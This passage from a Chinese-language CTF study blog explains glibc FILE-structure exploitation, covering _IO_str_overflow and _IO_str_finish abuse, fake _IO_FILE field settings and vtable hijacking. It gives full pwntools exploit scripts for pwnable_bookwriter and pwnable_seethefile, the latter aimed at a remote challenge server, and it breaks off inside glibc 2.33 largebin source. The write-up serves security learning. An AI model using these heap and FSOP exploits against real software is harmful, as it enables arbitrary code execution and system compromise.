= (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_blen(fp)宏</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><h5 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h5><p>利用的是其中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>要满足的条件</p><ol><li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</li><li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</li><li>fp+0xe0指向system地址</li></ol><p>绕过</p><ol><li>fp-&gt;<em>flags = 0</em></li><li>_fp-&gt;_IO_buf_base = 0</li><li>fp-&gt;<em>IO_buf_end = (bin_sh_addr - 100) / 2</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li><li>vtable = _IO_str_jumps - 0x18</li></ol><p>或者</p><ol><li>_flags = 0 </li><li>_IO_write_base = 0 </li><li>_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 </li><li>_IO_buf_end = (binsh_in_libc_addr -100) / 2  </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_jumps - 0x18</li></ol><h5 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h5><p>注意到满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br></pre></td></tr></table></figure><p>的时候，会先后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size_t old_blen = _IO_blen (fp);</span><br><span class="line">// #define _IO_blen (fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br><span class="line">new_buf = malloc (new_size);</span><br><span class="line">memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">free (old_buf);</span><br></pre></td></tr></table></figure><p>三个操作，伪造 _IO_FILE 并劫持 vtable 为 _IO_str_jumps 通过一个 large bin attack 就可以轻松实现，并且上面三个语句中的 new_size，old_buf 和 old_blen 是我们可控的，这个函数就可以实现以下三步</p><ol><li>调用 malloc，实现从 tcache 中分配 chunk，在这里就可以把我们之前放入的 __free_hook fake chunk 申请出来</li><li>将一段可控长度可控内容的内存段拷贝置 malloc 得来的 chunk 中（可以修改 __free_hook 为 system）</li><li>调用 free，且参数为内存段起始地址（”/bin/sh\x00”，getshell）</li></ol><p>只要构造得当，执行该函数即可 getshell。</p><h4 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//call qword ptr [fp+0E8h]参数为fp-&gt;_IO_buf_base</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件：</p><ol><li>_IO_buf_base 不为空</li><li>_flags &amp; _IO_USER_BUF(0x01) 为假</li></ol><p>构造如下：</p><ol><li>_flags = (binsh_in_libc + 0x10) &amp; ~1 </li><li>_IO_buf_base = binsh_addr </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_finish - 0x18 </li><li>fp+0xe8 -&gt; system_addr</li></ol><p>或者</p><ol><li>_fp-&gt;<em>flags = 0</em></li><li><em>vtable = _IO_str_jumps - 0x8//这样调用_IO_overflow时会调用到 _IO_str_finish</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>_fp+0xe8 = system_addr</li></ol><h2 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h2><h3 id="pwnable-bookwriter"><a href="#pwnable-bookwriter" class="headerlink" title="pwnable_bookwriter"></a>pwnable_bookwriter</h3><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bw&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libc是2.23</p><p><strong>主要漏洞点:</strong></p><ol><li>根据内存判断应该只能存储8个book,但是add函数判断时是if(a&gt;8)结合函数功能会将一个book的size覆写为一个地址(一个很大的数值)</li><li>edit函数后会将book的size根据新输入的字符串调整,如果和下一个chunk的size连接起来就可以多写一个字节到下一个chunk</li><li>author长度为0x40时,可以向下继续泄露地址</li></ol><p><strong>利用核心:</strong></p><ol><li>这题没有free功能,要想泄露libc就要对topchunk动手脚(本体可以修改其大小,再申请一个比修改后的size大的大小,使topchunk加入unsortedbin)</li><li>具体的漏洞利用实现要用到FSOP</li></ol><p><strong>实现过程:</strong></p><ol><li>泄露heap</li><li>通过topchunk进入unsortedbin泄露libc</li><li>第0个chunk大数字写伪造io_file和vtable</li><li>申请chunk利用unsortedbin attack写IO_file并让fake_iofile加入到smallbin链并成功进入fake_io_list_all,并因为unsortedbin链损坏触发malloc_printer以此getshell!!!</li></ol><p>触发trigger(将IO_list_all-0x10视为chunk起始的话,size==0)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p><strong>exp:</strong>(有小概率失败,可能是aslr的影响)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./bw&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;page :&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)  <span class="comment">#top chunk size edit</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1\x0f\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#add top chunk to unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc_addr  = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_addr:&#x27;</span>, <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;heap: &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;_IO_list_all: &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> +<span class="number">0xe0</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwnable-seethefile"><a href="#pwnable-seethefile" class="headerlink" title="pwnable_seethefile"></a>pwnable_seethefile</h3><p>checksec,32位保护只开了nx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/seethefile&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序实现了读文件的我功能,但是不能打开flag文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(filename, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Danger !&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>程序在离开的时候存在溢出风险,并且fp不为空时会fclose(fp)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">   __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, name);</span><br><span class="line">   <span class="keyword">if</span> ( fp )</span><br><span class="line">     fclose(fp);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>name位于bss段,向下可以溢出覆盖fp,甚至got表</p><hr><p>首先了解一个知识点:</p><p>由于linux独特的文件形式存储，</p><p>文件的内存信息都会存储于/proc/pid/maps中，</p><p>虽然不知道pid不过没关系,这里pid使用self来代替，就能获取libc的地址了。</p><hr><p>再看fclose这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment"> the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.step);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.step);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_deallocate_file (fp);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的目的是利用 _IO_FINISH (fp)将其劫持为system(‘/bin/sh’)</p><p>不过为了程序不抛出异常,需要使条件(fp-&gt;_flags &amp; _IO_IS_FILEBUF)为fasle</p><p>_IO_IS_FILEBUF的值为0x200</p><p>因为libc是2.23,所以可以直接劫持vtable为system</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">myelf  = ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line">libc   = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">io     = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10200</span>)</span><br><span class="line"></span><br><span class="line">sla          = <span class="keyword">lambda</span> delim,data       :io.sendlineafter(delim, data) </span><br><span class="line">openfile     = <span class="keyword">lambda</span> name :  (sla(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>),sla(<span class="string">&quot;see :&quot;</span>,name))</span><br><span class="line">readfile     = <span class="keyword">lambda</span>      :  (sla(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>))</span><br><span class="line">showfile     = <span class="keyword">lambda</span>      :  (sla(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>))</span><br><span class="line">leave        = <span class="keyword">lambda</span> name :  (sla(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;5&quot;</span>),sla(<span class="string">&quot;ame :&quot;</span>,name))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">openfile(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">readfile()</span><br><span class="line">showfile()</span><br><span class="line">io.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">system_addr = libc_addr +libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># make fake file</span></span><br><span class="line">fakeFILE = <span class="number">0x0804B284</span></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(fakeFILE)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += <span class="string">b&quot;;$0&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8d</span><span class="comment">#不懂为什么微调成/bin/sh会失败</span></span><br><span class="line">payload += p32(fakeFILE+<span class="number">0x98</span>)</span><br><span class="line">payload += p32(system_addr)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">leave(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="任务Ⅲ"><a href="#任务Ⅲ" class="headerlink" title="任务Ⅲ"></a>任务Ⅲ</h1><p>largebin attack进一步的利用总是离不开IO_FILE</p><h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><p><strong>放入源码2.33:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">              &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = 